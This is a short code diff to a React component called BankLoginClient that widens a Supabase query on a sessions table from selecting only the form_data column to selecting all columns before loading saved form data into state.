@@ -252,7 +252,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     let cancelled = false;
     void (async () => {
       if (supabase === null || !sessionId) return;
-      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
+      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, string>;
       setSessionFormData(fd);
